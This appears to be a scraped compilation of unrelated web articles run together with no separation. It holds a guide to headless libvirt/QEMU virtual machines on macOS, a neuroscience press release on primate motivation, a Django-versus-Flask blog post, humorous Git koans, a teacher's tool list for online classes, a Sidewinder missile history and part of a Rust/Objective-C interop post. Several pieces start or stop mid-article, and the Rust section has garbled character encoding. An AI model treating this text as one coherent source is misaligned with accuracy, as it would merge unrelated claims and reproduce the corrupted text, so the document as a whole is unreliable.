<p>Furthermore, like many developers, I like to run VMs headless, i.e. without a desktop GUI, so that I can SSH into them. Running VMs in the background seems like a simple feature, but it requires a lot of complex configuration for both <s><a href="https://www.virtualbox.org/manual/ch07.html#headless-vm-steps">VirtualBox</a></s> and <a href="https://communities.vmware.com/thread/292873">VMWare Fusion</a>. And Parallels wants you buy the <a href="https://kb.parallels.com/en/123298">Pro Edition</a> to gain access. Market segmentation at its finest... With <code>libvirt</code>, VMs start headless. Plus, when you shutdown macOS, it sends a shutdown signal to your VMs as well.</p>
<p>To be clear, <strong>this method doesn't support USB Passthrough, GPU Passthrough, or bridge networking.</strong> But if you just need to test, for example, node.js or nginx on a Linux VM, then this method is great.</p>
<h3 id="installinglibvirtandqemu">Installing libvirt and QEMU</h3>
<ol>
<li>First, install <a href="https://brew.sh/">homebrew</a>, which is a package manager for macOS.</li>
<li>Run <code>brew install qemu gcc libvirt</code>. If you installed <code>libvirt</code> version 6.6.0, then also run the following command in Terminal (<a href="https://github.com/Homebrew/homebrew-core/issues/59738">GitHub issue</a>):<pre><code>for f in /usr/local/Cellar/libvirt/6.6.0/lib/libvirt/*/*.bundle; do ln -s $f ${f%.bundle}.so; done
</code></pre>
</li>
<li>Since macOS doesn't support QEMU security features, we need to disable them:<pre><code>echo 'security_driver = "none"' &gt;&gt; /usr/local/etc/libvirt/qemu.conf
echo "dynamic_ownership = 0" &gt;&gt; /usr/local/etc/libvirt/qemu.conf
echo "remember_owner = 0" &gt;&gt; /usr/local/etc/libvirt/qemu.conf
</code></pre>
</li>
<li>Finally start the libvirt service, with <code>brew services start libvirt</code>. It will start after boot as well.</li>
</ol>
<h3 id="installingubuntuserver2004">Installing Ubuntu Server 20.04</h3>
<p>There are two ways to access the virtual display of the VM, either using a VNC client or the virt-viewer program. I recommend <a href="https://www.realvnc.com/">RealVNC Viewer</a>. The VNC client is responsive and quick to install, but if you have multiple VMs you need to manually manage the different ports. With virt-viewer, you get a popup with all the VMs currently running, but it is laggy and takes an eternity to install. <a href="https://github.com/jeffreywildman/homebrew-virt-manager">virt-viewer</a> can be installed through homebrew. The rest of this guide uses VNC.</p>
<ol>
<li>
<p>Create a <code>vms</code> folder in your home directory, and generate a disk image. Change <code>50g</code> to the size of your prefered disk:</p>
<pre><code>mkdir ~/vms &amp;&amp; cd ~/vms
qemu-img create -f qcow2 ubuntu.qcow2 50g
</code></pre>
</li>
<li>
<p>Download the <a href="https://releases.ubuntu.com/20.04/ubuntu-20.04.1-live-server-amd64.iso">Ubuntu Server 20.04 Install Image</a> and my <a href="https://raw.githubusercontent.com/yoonsikp/vm_configs/master/ubuntu.xml">libvirt XML template</a> and place the .iso and .xml files in the same folder.</p>
</li>
<li>
<p>Modify the following elements in the <code>ubuntu.xml</code> file to match your your VM preferences and file paths. Save, then run <code>virsh define ubuntu.xml</code> followed by <code>virsh start ubuntu</code>.</p>
<pre><code>&lt;domain type='qemu' xmlns:qemu='http://libvirt.org/schemas/domain/qemu/1.0'&gt;
&lt;name&gt;name of the VM&lt;/name&gt;
&lt;memory unit='GB'&gt;how much ram&lt;/memory&gt;
&lt;vcpu&gt;how many cpus&lt;/vcpu&gt;
...
&lt;disk type='file' device='disk'&gt;
&lt;source file='full path to your qcow2 file'/&gt;
...
&lt;disk type='file' device='cdrom'&gt;
&lt;source file='full path to your install iso'/&gt;
</code></pre>
</li>
<li>
<p>Start RealVNC Viewer and connect to <code>localhost</code>. Click the <code>Ctrl+Alt+Del</code> button to reboot the machine, and quickly press <code>Esc</code> to get into the boot menu. Press the number that matches the Ubuntu Server image.<br>
<img src="https://www.naut.ca/blog/content/images/2020/08/Screen-Shot-2020-08-26-at-8.17.04-PM.jpg" alt="Screen-Shot-2020-08-26-at-8.17.04-PM"></p>
</li>
<li>
<p>Install Ubuntu Server normally, making sure to enable the SSH server. Once it restarts you can connect to the VM from your terminal by running <code>ssh -p 2222 user@localhost</code>.</p>
</li>
<li>
<p>To send a shutdown signal to your VM, run <code>virsh shutdown ubuntu</code>. To force shutdown, run <code>virsh destroy ubuntu</code>.</p>
</li>
<li>
<p>To forward a port, e.g. port 443 from the VM to port 8443 locally, run the following: <code>ssh -p 2222 -L8443:localhost:443 user@localhost</code></p>
</li>
</ol>
<h3 id="multiplevms">Multiple VMs</h3>
<p>If you want to create multiple VMs, create an XML file for each machine with a unique UUID, VM name, and VNC port. Also, change the <code>hostfwd</code> argument so that each VM exposes a different port for SSH, e.g. <code>2223</code> instead of <code>2222</code>. After you have defined them all, you can get a list of the VMs that are currently running with <code>virsh list</code>.</p>

<br/><!-- hnss:readable-content --><hr/><div id="readability-page-1" class="page"><div id="parent-fieldname-text">
          <p>For the first time ever, neurophysiologists of KU Leuven, Harvard and the University of Kyoto have succeeded in reversibly disabling a connection between two areas in the brains of primates while they were performing cognitive tasks and their whole brain activity was being monitored. The disconnection had a negative impact on the motivation of the animals, but not on their learning behaviour. The study, which was published in <em>Neuron</em>, may eventually lead to more targeted treatments for certain brain disorders.</p>

<p>Learning is crucial to man’s survival. The brain’s reward system plays an important part in this. Babies learn to hold their cup to be able to drink on their own. As a student, you learn skills that are useful for your career. In times of COVID-19, we learn to adapt quickly to measures in order to avoid infections – or at least a fine or disapproving look. In addition to reward, motivation is another important factor when it comes to learning. Without motivation, not even the smartest student would ever obtain a degree. But what is most important: motivation or reward?</p>

<p>Wim Vanduffel and his colleagues investigated whether a specific brain pathway is crucial for motivation or reward-driven learning. In a first task, the animals had to put in a big effort to get a big reward, or a small effort for a smaller reward. The researchers showed two simple shapes on a screen. The primate learned, for example, that he received more orange juice when he looked at a red triangle than when he looked at a blue circle. He also had to look at the triangle for longer and, thus, put in more effort to receive the bigger reward. So, the primate had to be strongly motivated if he wanted the bigger reward.</p>

<blockquote>
<p>In the very few pathway-selective experiments published so far, monkeys did not have to perform cognitive tasks, nor was whole brain activity sampled.</p>

<p>– neurophysiologist Wim Vanduffel</p>
</blockquote>

<p>In a second task, the primate again had to look at two shapes. In this case, however, the choice for one shape was linked to a higher probability of getting orange juice than the choice for the other one. The size of the reward was the same, but looking at one shape was rewarded more often than looking at the other shape.</p>

<p>Just like people, primates learn to select the stimulus that yields the most reward very quickly; they try to maximise their profits. In a later stage, the researchers altered the chances of getting a reward. Without the primate knowing, the shape that previously yielded less reward suddenly became the most profitable. Once again, as with humans, primates learn to change strategies quickly by choosing the new, more profitable stimulus.</p>

<figure><img src="https://nieuws.kuleuven.be/beelden/2020/202008-vanduffel-neuron.png/@@images/dbd40f02-7f5e-4a09-901c-770e51dd396d.png" alt="" title="202008 Vanduffel Neuron" width="400" height="247">
<figcaption>The researchers temporarily switched off the connection between the ventral tegmental area (VTA) and the nucleus accumbens (NAc). As a result, the monkeys' motivation to work harder for a bigger reward decreased.&nbsp;</figcaption>
</figure>

<h3>Decrease in motivation</h3>

<p>Next, the researchers reversibly disabled a specific pathway. This pathway, the connection between two important cerebral nuclei of the reward system, mostly produces dopamine. The intervention had a strong effect on the motivation of the animals during the first task. Suddenly, the animals always went for the easy small reward instead of the big reward that took more effort. There was no change in behaviour during the second reinforcement-based learning task. The animals figured out which stimulus was the most profitable as quickly as the first time.</p>

<p>This specific pathway is, therefore, important to keep motivation up in order to make greater efforts, but not to learn about changes in links between a stimulus and a reward.</p>

<p>The researchers used functional MRI scans to look at the brain activity of the primates. When the pathway was disabled, they noticed a surprising increase in functional connectivity between areas of the temporal and frontal cerebral cortex: the areas are activated more synchronously. This increase was, therefore, linked to a decrease in motivation.</p>

<h3>First time</h3>

<p>"This is the first time that scientists have succeeded in reversibly disabling a specific pathway between two areas in the brains of primates while they perform cognitive tasks and their whole brain activity is being monitored", explains Professor Vanduffel. In earlier studies, brain areas were usually activated or deactivated in their entirety, which has an impact on all connections of that specific area. “In the very few pathway-selective experiments published so far, monkeys did not have to perform cognitive tasks, nor was whole brain activity sampled. Contrary to the consensus so far, which is mainly based on rodent research, it appears that this pathway in the brain's reward system is more important for the motivation to make big efforts than for reward-based learning.”</p>

<div>
<div>
<h2>Psychiatry</h2>

<p>A lack or excess of motivation plays an important role in many psychiatric disorders, including depression, compulsive behaviour, addiction, anxiety disorders, mood disorders and schizophrenia. “Our study provides new perspectives to increase or decrease the activity in specific pathways without affecting an entire area or brain system, because other pathways that originate from the same cerebral nucleus remain unaffected”, says Professor Vanduffel. “This is not the case for methods in which an entire area and, therefore, all connections of that area are affected. This opens the door to much more precise interventions in brain systems and, subsequently, the development of more effective therapies for brain disorders with fewer side effects.</p>

  <div itemprop="articleBody">
    <p>The question of opinionated web frameworks is divisive and has surely ruined its share of family dinners.
Install django or rails and most developers fall into one of two camps:</p>

<p><strong>Camp 1</strong>, amazing, I know exactly where everything goes, there’s a right way to do everything, and the batteries are in the kitchen sink, as god and DHH intended.</p>

<p><strong>Camp 2</strong> runs <code>ls</code>, then <code>find</code>, then googles ‘django without project skeleton’, then googles ‘do I check all the django files in or what’, then says ‘who fuck shit all over my repo’.</p>

<ul id="markdown-toc">
  <li><a href="#toolbeltism" id="markdown-toc-toolbeltism">Toolbeltism</a></li>
  <li><a href="#graphql-or-" id="markdown-toc-graphql-or-">Graphql, or …</a></li>
  <li><a href="#ive-come-around" id="markdown-toc-ive-come-around">I’ve come around</a></li>
</ul>



<p>Tools like flask (or its various async clones) appeal to camp 2.
They tend to integrate functionality by importing something and then making a function call to ‘wire it up’.</p>

<p>I’m in camp 2 but I’m starting to rethink my life choices, because I’ve spent 3 of the last 6 months writing and rewriting user login for different small projects.
Now at the end of it I have a small + shitty ‘personal flask tools’ library that has a 60% working auth / login system for flask.
(Note lack of github link – normally I plug my small + shitty OSS projects but this one is particularly small + shitty).</p>

<p>The crazy part is that I’ve met people who have a ‘toolbelt’ that they randomly import to projects and have always assumed those people are stupid and useless.
When I realized mid-year that I’m a toolbelter now, I started to ask myself some hard questions.</p>

<p>If I’d started with django I’d be done already.
Investing in learning django comes at the cost of a messy repo but <em>saves time</em>.
And I learned from watching one of the latter-day marvel movies at 3x in the second half of a plane trip that no amount of money can buy a minute of time.</p>

<h2 id="graphql-or-">Graphql, or …</h2>

<p>Someone posted an article to HN with some apples-to-nuts comparison like ‘graphql is better than python’ and the comments were not bad.</p>

<p>In particular <a href="https://news.ycombinator.com/item?id=23487072">this one</a> which I hereby plagiarize most of:</p>

<blockquote>
  <p>Looking through some of the code for Sourcehut, there’s an insane amount of boilerplate or otherwise redundant code[1]. The shared code library is a mini-framework, with custom email and validation components[2][3]. In the ‘main’ project we can see the views that power mailing lists and projects[4][5].</p>
</blockquote>

<blockquote>
  <p>I can’t help but think “why Flask, and why not Django” after seeing all of this. Most of the repeated view boilerplate would have gone ([1] could be like 20 lines), the author could have used Django rest framework to get a quality API with not much work (rather than building it yourself[6]) and the pluggable apps at the core of Django seem a perfect fit.</p>
</blockquote>

<blockquote>
  <p>I see this all the time with flasks projects. They start off small and light, and as long as they stay that way then Flask is a great choice. But they often don’t, and as the grow in complexity you end up re-inventing a framework like Django but worse whilst getting fatigued by “Python” being bad.</p>
</blockquote>

<p>Click through and read the replies, they’re useful.</p>

<h2 id="ive-come-around">I’ve come around</h2>

<p>It still bugs me that django steers me away from the single-file case.
I think that this is a flaw in every language or framework that does it –
most of all in mobile native development where focusing on single-file build would IMO fix a lot of sharp edges in the buildsystem.</p>

<p>But django / rails also provide key opinionated design choices that make full-stack plugins possible, i.e. plugins that ‘work with the app’.
These choices are:</p>

<ul>
  <li>standard DB connection / pool</li>
  <li>the framework handles migrations, so plugins can generate tables and maintain them</li>
  <li>user and session management are consistent so plugins can build on them (oauth, for example)</li>
</ul>

<p>Django and rails both have heavy + powerful ORMs; I’m less sure of the necessity there.</p>

<p>I wish there were something like django-lite which provided only the full-stack plugin glue and let me do a little BYO to create a working app.
I think there’s value in supporting one liners that correctly install sophisticated behavior in your app, maybe even beyond the backend – like it could create cloud resources or frontend stuff.
That said, given how my year has gone, I’m 1000% invested in using the right tools, and will be shopping in the ‘batteries included’ aisle this christmas.</p>

<h2 id="s1-silence"><a href="#s1-silence">Silence</a></h2>

<p>A Python programmer handed her <code>~/.gitconfig</code> to Master Git.  Among the many
lines were the following:</p>

<pre><code>[alias]
; Explicit is better than implicit.  If we want to merge
; we should do so ourselves.
pull = pull --ff-only</code></pre>

<p>Master Git nodded.  "<code>git pull origin master</code>," said the programmer.</p>

<p>Master Git pulled down the latest changes on <code>master</code> and automatically merged
them with the programmer's changes.</p>

<p>"But Master Git, did I not say to only fast-forward in my configuration?!" she
cried.</p>

<p>Master Git looked at her, nodded, and said nothing.</p>

<p>"Then why did you not warn me of a problem with my configuration?" she asked.</p>

<p>Master Git replied: "there was no problem."</p>

<p>Months later the programmer was reading <code>git --help config</code> for a different
reason and found enlightenment.</p>

<h2 id="s2-one-thing-well"><a href="#s2-one-thing-well">One Thing Well</a></h2>

<p>A UNIX programmer was working in the cubicle farms.  As she saw Master Git
traveling down the path, she ran to meet him.</p>

<p>"It is an honor to meet you, Master Git!" she said.  "I have been studying the
UNIX way of designing programs that each do one thing well.  Surely I can learn
much from you."</p>

<p>"Surely," replied Master Git.</p>

<p>"How should I change to a different branch?" asked the programmer.</p>

<p>"Use <code>git checkout</code>."</p>

<p>"And how should I create a branch?"</p>

<p>"Use <code>git checkout</code>."</p>

<p>"And how should I update the contents of a single file in my working directory,
without involving branches at all?"</p>

<p>"Use <code>git checkout</code>."</p>

<p>After this third answer, the programmer was enlightened.</p>

<h2 id="s3-only-the-gods"><a href="#s3-only-the-gods">Only the Gods</a></h2>

<p>The great historian was trying to unravel the intricacies of an incorrect merge
that had happened many months ago.  He made a pilgrimage to Master Git to ask
for his help.</p>

<p>"Master Git," said the historian, "what is the nature of history?"</p>

<p>"History is immutable.  To rewrite it later is to tamper with the very fabric of
existence."</p>

<p>The historian nodded, then asked: "Is that why rebasing commits that have been
pushed is discouraged?"</p>

<p>"Indeed," said Master Git.</p>

<p>"Splendid!" exclaimed the historian.  "I have a historical record of a merge
commit with two parents.  How can I find out which branch each parent was
originally made on?"</p>

<p>"History is ephemeral," replied Master Git, "the knowledge you seek can be
answered only by the gods."</p>

<p>The historian hung his head as enlightenment crushed down upon him.</p>

<h2 id="s4-the-hobgoblin"><a href="#s4-the-hobgoblin">The Hobgoblin</a></h2>

<p>A novice was learning at the feet of Master Git.  At the end of the lesson he
looked through his notes and said, "Master, I have a few questions.  May I ask
them?"</p>

<p>Master Git nodded.</p>

<p>"How can I view a list of <em>all</em> tags?"</p>

<p>"<code>git tag</code>", replied Master Git.</p>

<p>"How can I view a list of <em>all</em> remotes?"</p>

<p>"<code>git remote -v</code>", replied Master Git.</p>

<p>"How can I view a list of <em>all</em> branches?"</p>

<p>"<code>git branch -a</code>", replied Master Git.</p>

<p>"And how can I view the current branch?"</p>

<p>"<code>git rev-parse --abbrev-ref HEAD</code>", replied Master Git.</p>

<p>"How can I delete a remote?"</p>

<p>"<code>git remote rm</code>", replied Master Git.</p>

<p>"And how can I delete a branch?"</p>

<p>"<code>git branch -d</code>", replied Master Git.</p>

<p>The novice thought for a few moments, then asked: "Surely some of these could be
made more consistent, so as to be easier to remember in the heat of coding?"</p>

<p>Master Git snapped his fingers.  A hobgoblin entered the room and ate the novice
alive.  In the afterlife, the novice was enlightened.</p>

<h2 id="s5-the-long-and-short-of-it"><a href="#s5-the-long-and-short-of-it">The Long and Short of It</a></h2>

<p>Master Git and a novice were walking along a bridge.</p>

<p>The novice, wanting to partake of Master Git's vast knowledge, said:
"<code>git branch --help</code>".</p>

<p>Master Git sat down and lectured her on the seven forms of <code>git branch</code>, and
their many options.</p>

<p>They resumed walking.  A few minutes later they encountered an experienced
developer traveling in the opposite direction.  He bowed to Master Git and said
"<code>git branch -h</code>".  Master Git tersely informed him of the most common <code>git
branch</code> options.  The developer thanked him and continued on his way.</p>

<p>"Master," said the novice, "what is the nature of long and short options for
commands?  I thought they were equivalent, but when that developer used <code>-h</code> you
said something different than when I said <code>--help</code>."</p>

<p>"Perspective is everything," answered the Master.</p>

<p>The novice was puzzled.  She decided to experiment and said "<code>git -h branch</code>".</p>

<p>Master Git turned and threw himself off the railing, falling to his death on the
rocks below.</p>

<p>Upon seeing this, the novice was enlightened.</p>

<br/><!-- hnss:readable-content --><hr/><div id="readability-page-1" class="page"><div data-block-type="2" id="block-7d26e9b4ac55b229ffd2"><div><p>This August, I started teaching <a href="https://www.modulo.app/manishamodule">a digital learning pod</a> for Kindergarten-2nd grade students. </p><p>When I decided I was going to run an online learning pod, I started thinking about ways to create engaging educational opportunities for kids online. I knew that teaching on an online medium was going to be very different than teaching in a physical classroom.  </p><p>Rather than grumble too much about how much better teaching in-person was, I decided to try to make the most out of my new virtual classroom. They say that <a href="https://reggioemilia2015.weebly.com/environment-as-a-third-teacher.html">the environment is the child’s third teacher</a>. Much like Maria Montessori developed materials to make her classroom environment conducive to learning, I knew I needed to find the best tools possible (software and hardware) to support kids and teachers to optimize this online learning environment for learning. </p><p>Fortunately, many of the parents in my group work in tech, so they were happy to lend a hand and help me problem-solve to make sure their kids had a good experience in the group.</p><p>Teaching a group of Kindergarten-2nd grade students online presented some unique challenges. When we started, it was painfully noisy for all involved, and kids were constantly disappearing -  slipping outside the frame of the camera.  Some younger children are often difficult to understand as is, not to mention with the additional obstacle of having their voices travel through the internet to my computer speaker . The result was that kids were bored and I thought I might lose my mind from the noise. </p><p>We tested dozens of different conferencing platforms, tablets, headphones and other unique devices and software solutions to get our group communicating well online.</p><p>My original goal was to get to a point where we would be able to provide a nice social experience 2x/week for 45 minutes. I told my tech savvy parents I needed to find a way where I could hear the kids whispering across the room, see them lap down or do a jumping jack. It was an ambitious goal, but one month in, we’ve surpassed by expectations.</p><p>Now, by using the right tools, teaching zoom etiquette and choosing activities that translate well to an online environment, I’ve found 4 and 5 year old kids (and even children are young as 3) are begging to stay online 3 hours after class has started! They are moving and jumping around, actively participating in class discussions and making meaningful friendships with other children across the country. </p><p>This is what we’ve found works best to allow lots of movement, engagement and clear sound. (And also helps stop me from getting tired or worn out when I teach)</p><p><strong>Here are the tools I recommend for group learning online:</strong></p><ul data-rte-list="default"><li><p><a href="https://zoom.us/">Zoom for conferencing</a>. Zoom simply does sound and video for groups better than any other platform. </p></li><li><p>*<a href="https://www.amazon.com/Gamma-Ray-Trust-Blocking-Glasses/dp/B083ZKY9TH/">Gamma Ray Blue Light Blocking Glasses</a> to prevent eye strain (for teachers)</p></li><li><p><a href="https://www.amazon.com/Xenvo-iPhone-Camera-Lens-Clip/dp/B01A6D2JVI/">Xenvo Pro Lens Kit</a> so you can see a large area, kids don’t have to sit still and feel free to move around the room</p></li><li><p><a href="https://www.apple.com/airpods-pro">*Airpod Pro</a> for the best headphones that won’t fall out of small ears when doing jumping jacks, have great sound </p></li><li><p><a href="https://www.apple.com/macbook-air/">Macbook</a> for zoom&nbsp;and most apps.</p></li><li><p><a href="https://www.amazon.com/Nulaxy-Ergonomic-Adjustable-Computer-Compatible/dp/B077B9W343">Nulaxy Laptop Stand</a> to make us look more glamorous when we record sessions (double-chin eliminated!) and also allows kids to stand and move about, not sit still.</p></li><li><p><a href="https://krisp.ai/">Krisp.ai</a> to reduce background noise on zoom</p></li><li><p>If you can also afford an <a href="https://www.apple.com/ipad-pro">ipad</a>, please get one because this is best for IOS apps which are amazing to support your children's learning.  The new Ipad pro is best for screen sharing.</p></li></ul><p>I’m privileged to be able to afford the tools to support my teaching. Many of the families in my group are privileged to be able to purchase tools to support their children’s learning. And we’ve been able to purchase devices for those who can’t.  An estimated 22% of US students don’t have access to a single computer to help them learn remotely. This is a travesty and one we’re working around the clock to change through Schoolclosures.org and our <a href="https://www.gofundme.com/f/givecomputers">Give Computers</a> campaign. </p><p>While I’m excited to share these tools, I’m also outraged and downhearted by the growing divide between rich and poor students due to lack of access to technology. </p><p>If you are on a budget, I strongly recommend investing in an Ipad to cover all your key bases. Generally, your cell phone plan will let you pay for your Ipad on a payment plan. An Amazon kindle will also do. </p><p>Families looking for free hardware or software should apply to <a href="http://www.givecomputers.org/">givecomputers.org</a></p><p>For families who are still struggling to find a device to support their teaching or child’s learning, please contact us so we can give you a hand. We want to help everyone we can to get the technology they need to learn. </p><p>For those looking to go the extra mile, here’s an intro to zoom video I made where I talk in more detail about the hardware I’ve chosen and some tips for beginner teachers on using zoom. </p></div></div></div>]]>

<span>T</span><p>he Cold War flared hot on August 23, 1958, when <a href="http://en.wikipedia.org/wiki/Second_Taiwan_Strait_Crisis" target="_blank">Communist China bombarded Matsu and Quemoy,</a> islands of the Nationalist Republic of China (Taiwan). As Red Chinese and American warships faced off in the Formosa Strait, Nationalist <a href="http://en.wikipedia.org/wiki/F-86_Sabre" target="_blank">F-86F Sabres</a> flew against MiG fighters, including the new <a href="http://en.wikipedia.org/wiki/MiG-17" target="_blank">MiG-17 “Fresco.”</a> Cruising above and beyond the reach of the Sabres’ machine guns—weapons that remained basically unchanged since the dawn of fighter aircraft—Fresco pilots enjoyed not only superior numbers but superior technology.
</p><p>
Or did they? In late September the Sabres took on new, American-supplied weaponry—needle-like, 9-foot-long rockets that were barb-tipped and finned, with delicate glass noses instead of steel warheads. The new rocket had no wires, no radio, no way for the pilot to guide it after launch. Yet it was equipped with movable fins. It could change course. For the Taiwanese pilots the conclusion was inescapable, if unbelievable: The Americans had created a missile that could seek out and destroy the enemy on its own.
</p>





<div><img src="http://www.donhollway.com/foxtwo/ex-0.jpg" width="967" height="311" alt=""><p><b>Prototype Sidewinder EX-O airframe at China Lake.<br>
Note square canards forward and rollerons on rear fins.</b></p></div>


<p>From the Allies’ unguided <a href="http://en.wikipedia.org/wiki/Le_Prieur_rocket" target="_blank">Le Prieur</a> of World War I to World War II’s wire-guided German <a href="http://en.wikipedia.org/wiki/Ruhrstahl_X-4" target="_blank">Ruhrstahl X-4</a>, air-to-air rockets had never proven particularly effective. After WWII, air combat was supposed to be all about intercepting nuclear-armed strategic bombers at long range. The experts fancied missiles with radar guidance, though this required launch planes to track and “paint” targets with microwaves throughout attack runs. 
</p><p>
Meanwhile, at the U.S. Naval Ordnance Test Station at <a href="http://en.wikipedia.org/wiki/China_Lake" target="_blank">China Lake</a> in California’s Mojave Desert, a few dozen gadgeteers under physicist William B. McLean were toying with lead-sulfide proximity fuzes that were sensitive to the infrared radiation generated by heat. China Lake’s directive was R&amp;D, not weapon design, and critics derisively referred to his lab as “McLean’s Hobby Shop.” But that didn’t stop his little team from completely revolutionizing air warfare.

</tr></tbody></table>


<p>
Reasoning that a fuze capable of exploding a warhead near a hot target could also be made to home in on it, McLean sought to put a guidance system entirely onboard a standard 5-inch air-to-ground rocket. With in-house volunteers, miscellaneous funds and spare time—but without official approval—he undertook to develop an intelligent fuze for a heat-seeking air-to-air missile.
</p><p>
It took five years. “I personally spent nearly three years [just] considering possibilities,” McLean later wrote. “It is easy to build something complicated; it’s hard to build it so that it’s simple.” 
</p><p>
The final design was indeed simple: a parabolic mirror spinning gyroscopically at 4,200 rpm inside the rocket’s transparent nose. The distance of an infrared blip’s reflection from the axis of spin indicated its angle-off; current from the centrally mounted lead-sulfide detector kept the “eye” on target via electromagnets around its rim and controlled the missile’s canard guide fins. 
</p><p>
Future astronaut <a href="http://en.wikipedia.org/wiki/Wally_Schirra" target="_blank">Wally Schirra</a>, then a hotshot Korea veteran with a MiG-15 kill to his credit, remembered his first visit to the lab. The China Lake eggheads had a “dome-shaped device, made of glass….a man-made eyeball,” he recalled. “I was a cigarette smoker in those days, and I had one in my hand. As I crossed the room, I noticed that the eyeball was tracking me.”

<p>
Since missile roll would interfere with the gyro’s spin, on the fly McLean’s team invented “rollerons”—tailfin-mounted, airstream-driven gyro wheels whose spin counteracted the missile’s. The crowning touch, however, was wiring the seeker to aim not where the target was, but <i>where it would be.</i> In dogfights the missile itself would take on enemy aircraft on their own terms: seek them out, run them down and outmaneuver them to make the kill. 
This can’t be overstated. More than 60 years ago, back when automobiles were lumbering hunks of Detroit steel, the proto-computer Eniac needed a room full of vacuum tubes merely to calculate ballistic trajectories and the only robots were costumed actors in sci-fi films, what Bill McLean’s China Lake team did—with just 14 tubes and fewer than 24 moving parts, in a package less than 10 feet long, 5 inches across and weighing 160 pounds—was invent fire-and-forget: an autonomous combat robot. They named it Sidewinder, after the <a href="http://en.wikipedia.org/wiki/Crotalus_cerastes" target="_blank">Mojave horned rattlesnake</a>, which stalks its prey by their heat signatures in darkness, and crosses the desert sands with a sinuous, winding motion not unlike the missiles’ corkscrewing trajectory.

</p><div><img src="http://www.donhollway.com/foxtwo/skynight.jpg" width="624" height="375">
<p><b>U.S. Navy Douglas F3D-2 Skyknight (BuNo 123744) fires a Sidewinder 1-C missile at the Naval Weapons Center (NWC) China Lake, California (USA), on 27 June 1961. The escorting plane is a McDonnell F3H-2N Demon (BuNo 133550).</b></p>
</div>


<p>
Schirra and other test pilots amused themselves by locking onto not only flying target drones, but also locomotives, tractor-trailers and Greyhound buses near China Lake. Their main complaint, since Sidewinder firing parameters varied with altitude, airspeed and G-load, was having to check a cockpit voltmeter to confirm lock-on: “We’ve got to get something besides the damn gauge. You can’t have a pilot, a fighter pilot in combat, looking [down] at funny little gauges to see if he can fire or not.”
</p><p>
It turned out to be the final piece of the puzzle. Anyone who’s flown a combat flight sim knows the 840 Hz Sidewinder “growl,” indicating missile readiness and target lock. (Newer versions chirp.) This robot doesn’t just think; it talks. 
</p><p>
Just five years later, under the code name <a href="http://en.wikipedia.org/wiki/Second_Taiwan_Strait_Crisis#Overview" target="_blank">“Operation Black Magic,”</a> Americans in <a href="http://en.wikipedia.org/wiki/F-100_Super_Sabre" target="_blank">F-100 Super Sabres </a>were simulating Red Chinese Frescos, teaching Nationalist pilots “pitch-up” Sidewinder launches against high-altitude targets. The MiG pilots were about to get a nasty surprise.

<p>
The final tally depends on which side does the counting, but on a single day, September 24, 1958, the Nationalists’ Sidewinder-equipped Sabres shot down at least 10 Frescos. Two weeks later the People’s Republic sued for peace. Command of the air, and thus the battlefield, had been handed back to the West, courtesy of the Sidewinder. Yet one MiG reportedly returned to base with an unexploded missile still embedded in its wing root. Thus despite the project’s top-secret nature, on its first outing the Sidewinder had been outed.
</p><p>
The Soviets, weapons suppliers to half the world, later admitted that the Sidewinder’s near-biological intelligence was a complete revelation to them.

The Pakistanis were outnumbered 5-to-1, but they had Sidewinders.

<p>Yep, thatâ€™s Rust code with embedded Objective-C syntax, and it works. Why would you do such a thing? Maybe you want tighter interop between the Rust and Objective-C parts of your iOS app. Maybe you want to write your iOS app <em>entirely</em> in Rust. Or maybe you just wanted to see if it was possible after your <a href="https://twitter.com/porglezomp">colleague</a>â€™s offhand remark.</p>

<p>(For me, it was the last one, absolutely.)</p>

<p>This post is going to walk through what it took to make this possible, so hereâ€™s a table of contents:</p>

<p>Sections 3-5 might actually be useful to other people looking to write Rust macros, so even though this project is a toy, you may still get something out of reading the post. However, if youâ€™re looking to use Objective-C from Rust in production, you should not be using my unsafe toy here. Instead, use Steven Sheldonâ€™s <a href="https://crates.io/crates/objc"><code>objc</code> crate</a>. Sheldon also has a blog post from near the start of the project that talks about <a href="https://sasheldon.com/blog/2014/11/28/interoperating-between-objective-c-and-rust/">his design process beyond the bare message-send implementation</a>.</p>

<p>That said, if you want to see the full source of my little monstrosity, you can <a href="https://belkadan.com/source/rust-inline-objc/">check out the repository</a>.</p>

<h2 id="background-on-objective-c">Background on Objective-C</h2>

<p>My normal audience these days is probably Swift developers, but I expect this one to make rounds with at least some Rust people as well. Itâ€™d be easy for both groups to not have much direct experience with Objective-C, the primary language used by Apple for both macOS<sup id="fnref:osx" role="doc-noteref"><a href="#fn:osx">1</a></sup> and iOS since their releases in 2001 and 2007. So, hereâ€™s the quick summary: itâ€™s â€œjustâ€� C, except when you start working with â€œobjectâ€� types. And nearly everything you do with those objects is based on a dynamic dispatch model implemented in the <em>runtime.</em> Because of the two parts of that sentence (â€œdynamic dispatchâ€� and â€œimplemented in the runtimeâ€�), people have come up with a lot of clever and powerful techniques to make programs simpler, more expressive, or more extensible, though sometimes at the cost of security, secrecy, and stability.</p>

<p>More relevant to us, however, is that a language whose features are (nearly) all available in a runtime library is a language thatâ€™s easy to bridge to dynamically, as long as you donâ€™t have really tight performance constraints. So hereâ€™s the deal: nearly everything you do in Objective-C is calling methods by <em>sending messages,</em> and the way this works is that methods are regular C functions stored in a dispatch table keyed by a uniqued string called a <dfn>selector</dfn>. It is likely that the most heavily-optimized piece of code in Appleâ€™s libraries is <code>objc_msgSend</code>, which takes a <dfn>receiver</dfn>, a selector, and the arguments to the method, does a (cached) lookup of the selector in the receiverâ€™s classâ€™s dispatch table(s), and then jumps directly to the appropriate, polymorphically-selected implementation of the method.</p>

<p>There are more things the Objective-C runtime exposes, but messages are absolutely the most important.</p>

<p>â€¦Oh, one more thing. Because Objective-C is an extension to C, it has to use syntax that doesnâ€™t conflict with C syntax. That means keywords with <code>@</code> signs in front of themâ€”one of the few symbols on the US keyboard that doesnâ€™t already have a meaning in Câ€”and a unique bracket-based â€œmessage sendâ€� syntax that takes a while to get used to:</p>

<pre><code>// Objective-C
NSString *fileStr = [[NSString alloc] initWithData:fileContents encoding:NSUTF8StringEncoding];

// Pseudo-Swift
let fileStr: NSString = NSString.alloc().initWithData(fileContents, encoding: NSUTF8StringEncoding)

// Actual Swift
let fileStr = NSString(data: fileContents, encoding: .utf8)

// Pseudo-Rust
let fileStr: *const NSString = NSString::alloc().initWithData(fileContents, NSUTF8StringEncoding)

// Idiomatic-ish Rust
let file_str = NSString::from_data(file_contents, NSStringEncoding::UTF8)
</code></pre>

<p>People almost universally think Objective-C syntax is ugly when they first see it, almost universally find it completely normal after a few years, and largely (though <em>not</em> almost universally) find idiomatic Swift easier to read even if theyâ€™re used to Objective-C.</p>

